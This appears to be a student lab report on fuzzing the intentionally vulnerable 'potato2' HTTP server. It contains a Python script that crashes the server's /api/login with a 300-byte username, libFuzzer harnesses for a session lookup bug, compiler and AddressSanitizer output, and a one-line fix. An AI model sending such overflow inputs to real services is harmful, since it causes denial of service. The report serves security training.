# Laborbericht: Schwachstellenidentifikation mittels Protokoll-Fuzzing (potato2-Server)

## 1. Einleitung & Methodik
This report documents the analysis and identification of two separate vulnerabilities in the network component (`src/http_server.c` and `src/session.c`) of the **potato2** project. Unlike previous local attacks on the application console (`./potato console`), this approach focuses on automated fuzzing over the network, targeting the HTTP service on port 80 directly.
---

## 2. Schwachstelle 1: Stack Buffer Overflow via `/api/login`

### Test-Skript (`crash_login.py`)

```python
import requests

url = "[http://127.0.0.1/api/login](http://127.0.0.1/api/login)"
bad_username = "A" * 300
payload = {"username": bad_username, "password": "x"}

print("[*] Sending huge payload to /api/login...")

try:
    response = requests.post(url, data=payload, timeout=3)
    print("Response code:", response.status_code)
except Exception as e:
    print("[!] Connection lost! Check the server terminal for a Segmentation fault!")
```

![](images/fuzzing_attempt1_code_trial1_sucess.png)
![](images/fuzzing_attempt1_task1_sucess.png)

As documented in the screenshots from the testing phase, sending a malformed fuzzing input of 300 bytes (`“A” * 300`) to the `username` parameter results in an immediate denial of service. According to the server logs, the application initially processes the POST request up to the `no such user` validation logic and then abruptly terminates immediately afterward. 
The stack frame is completely overflowed. Sending this large number of characters overwrites the administrative metadata on the stack—the saved return pointer. As soon as the function is about to terminate and attempts to jump back to this manipulated address, the operating system intercepts the illegal memory access and terminates the server process with a `segmentation fault`. This is visually confirmed in the browser by the error message *“Problem loading page”*.



As documented in the code analysis screenshot, in-memory fuzzing of the session management system exposed a critical logical flaw within `src/session.c`, which is flagged by the compiler with the warning `non-void function does not return a value in all control paths`. 

When the `get_session_by_id()` function is fed with randomized, non-existent fuzzer cookie inputs, the internal lookup loop fails, and the program execution reaches the end of the function block (line 64) without hitting an explicit return statement. This triggers classic Undefined Behavior (UB) at the architectural level: instead of returning a safe `NULL` pointer, the function passes back an unpredictable "garbage value" that happened to be left behind in the CPU register. 

While the isolated fuzzer harness does not crash from this (as it discards the return value), it creates a severe vulnerability downstream for the live HTTP server. The web server mistakenly interprets this arbitrary garbage value as a "valid session structure address" and attempts to read or write to that corrupt object location in memory, resulting in unhandled memory faults or critical authentication logic bypasses.

![](images/fuzzing_task1_2nd_attempt_no_crash.png)

Used Code:
```python
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>

// Deklaration der zu testenden internen Kernfunktion
extern void* get_session_by_id(const char* session_id);

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size == 0 || size > 512) return 0;
    
    // Konvertierung der rohen Fuzzer-Bytes in einen validen C-String
    char *mock_cookie = malloc(size + 1);
    if (!mock_cookie) return 0;
    memcpy(mock_cookie, data, size);
    mock_cookie[size] = '\0';

    t_session *sess = get_session_by_id(mock_cookie);
    if (sess) {
            // Force reading from the structure
            volatile t_user *u = sess->logged_in_user;
            (void)u;
    }
    
    free(mock_cookie);
    return 0;
}
}
```

### Code Triage for Vulnerability 2 (Undefined Behavior in session.c)
During compilation of the fuzzing harness using `clang`, a critical structural vulnerability was identified via compiler diagnostics in `src/session.c`:
`src/session.c:64:1: warning: non-void function does not return a value in all control paths [-Wreturn-type]`

* **Root Cause:** The function `get_session_by_id()` iterates through active sessions. If a fuzzed/non-existent cookie string is provided, the execution path exits the loop and reaches the end of the block without hitting a return statement. 
* **Impact:** This triggers classic Undefined Behavior (UB). The function returns an unpredictable arbitrary value left over in the CPU register instead of a clean pointer. When the calling web server attempts to read from this unvalidated garbage pointer downstream, it leads to memory corruption or application failure.

* **Fix:** Add a default return statement at the end of the function:
```c
// at the very end of get_session_by_id inside src/session.c
return NULL;
```

Now updated 15:28 with the new file fuzz_session.c This Output comes from Kali Linux (server did not crash)
```c
                                                                                
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ ls
build.sh          install.sh
corpus            pwn_potato2.py
crash_login.py    README.md
Dockerfile.amd64  res
Dockerfile.i386   run32.sh
docs              run64.sh
fuzz_cookies.py   slow-unit-7727abf0d74cf46054ff38a232df9ee14ea8b32d
fuzz_session.c    src
http_client.py    userlist
                                                                                 
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ cat fuzz_session.c
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include "session.h"

extern t_session* sessions[];

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    if (size == 0 || size > 512) return 0;
    
    char *mock_cookie = malloc(size + 1);
    if (!mock_cookie) return 0;
    memcpy(mock_cookie, data, size);
    mock_cookie[size] = '\0';

    t_session dummy;
    memset(&dummy, 0, sizeof(dummy));
    strcpy(dummy.session_id, "dummy_sess");
    sessions[99] = &dummy;

    t_session *sess = get_session_by_id(mock_cookie);
    if (sess) {
        volatile t_user *u = sess->logged_in_user; 
        (void)u;
    }

    sessions[99] = NULL; 
    free(mock_cookie);
    return 0;
}
                                                                                 
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ clang -fsanitize=fuzzer,address -I./src fuzz_session.c src/session.c -o fuzzer_session
src/session.c:59:41: warning: comparison of array
      'sessions[i]->session_id' equal to a null pointer is always false
      [-Wtautological-pointer-compare]
   59 |         if(sessions[i] == NULL || sessions[i]->session_id == NULL) 
      |                                   ~~~~~~~~~~~~~^~~~~~~~~~    ~~~~
src/session.c:64:1: warning: non-void function does not                          
      return a value in all control paths [-Wreturn-type]
   64 | }
      | ^
2 warnings generated.                                                            
                                                                                 
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ ./fuzzer_session corpus/
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 1362730940
INFO: Loaded 1 modules   (29 inline 8-bit counters): 29 [0x55b7df58beb0, 0x55b7df58becd), 
INFO: Loaded 1 PC tables (29 PCs): 29 [0x55b7df58bed0,0x55b7df58c0a0), 
INFO:        0 files found in corpus/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
AddressSanitizer:DEADLYSIGNAL
=================================================================
==39496==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x55b7df5427ee bp 0x7fff5ac209b0 sp 0x7fff5ac208c0 T0)                               
==39496==The signal is caused by a READ memory access.                           
==39496==Hint: address points to the zero page.
    #0 0x55b7df5427ee in LLVMFuzzerTestOneInput (/home/kali/Downloads/potato2-main/fuzzer_session+0x1517ee) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #1 0x55b7df43f86f in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/kali/Downloads/potato2-main/fuzzer_session+0x4e86f) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #2 0x55b7df43ee99 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) (/home/kali/Downloads/potato2-main/fuzzer_session+0x4de99) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #3 0x55b7df440bef in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::vector<fuzzer::SizedFile, std::allocator<fuzzer::SizedFile>>&) (/home/kali/Downloads/potato2-main/fuzzer_session+0x4fbef) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #4 0x55b7df4411cb in fuzzer::Fuzzer::Loop(std::vector<fuzzer::SizedFile, std::allocator<fuzzer::SizedFile>>&) (/home/kali/Downloads/potato2-main/fuzzer_session+0x501cb) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #5 0x55b7df42e1a0 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/kali/Downloads/potato2-main/fuzzer_session+0x3d1a0) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #6 0x55b7df458e96 in main (/home/kali/Downloads/potato2-main/fuzzer_session+0x67e96) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)
    #7 0x7f3b9593df74  (/usr/lib/x86_64-linux-gnu/libc.so.6+0x29f74) (BuildId: c9a199fd28ea54b305ea35a8b25500a79bfe684a)
    #8 0x7f3b9593e026 in __libc_start_main (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a026) (BuildId: c9a199fd28ea54b305ea35a8b25500a79bfe684a)
    #9 0x55b7df4229a0 in _start (/home/kali/Downloads/potato2-main/fuzzer_session+0x319a0) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf)

==39496==Register values:
rax = 0x0000000000000001  rbx = 0x00007fff5ac208c0  rcx = 0x0000000000000000  rdx = 0x000055b7df58c800  
rdi = 0x0000000000000002  rsi = 0x000055b7df58be90  rbp = 0x00007fff5ac209b0  rsp = 0x00007fff5ac208c0  
 r8 = 0x0000000000000001   r9 = 0xfa02fafafa01fa01  r10 = 0x00000f6b7293c00e  r11 = 0x0000000000000000  
r12 = 0x00007b5b949e0030  r13 = 0x000055b7df58c800  r14 = 0x00007b5b949e0050  r15 = 0x0000000000000001  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/home/kali/Downloads/potato2-main/fuzzer_session+0x1517ee) (BuildId: a3469a35b7db280bac2df65ae56c162940ba3dbf) in LLVMFuzzerTestOneInput
==39496==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
0xa,
\012
artifact_prefix='./'; Test unit written to ./crash-adc83b19e793491b1c6ea0fd8b46cd9f32e592fc
Base64: Cg==
                                                                                 
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ 
                                               
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ ./fuzz_session.c corpus/
zsh: permission denied: ./fuzz_session.c
                                                                                 
┌──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ 
```

Second terminal window service is still running:
```
──(kali㉿kali)-[~/Downloads/potato2-main]
└─$ sudo ./run32.sh http
[sudo] password for kali: 
WARNING: Published ports are discarded when using host network mode
starting up (pid 38879)
reading file userlist
[session.c:51] session ready.
handle_client
cmd> Server running on port 80...

Type 'help' to print the usage.
cmd> method: 'GET' path '/'
[http_server.c:212] GET index
```


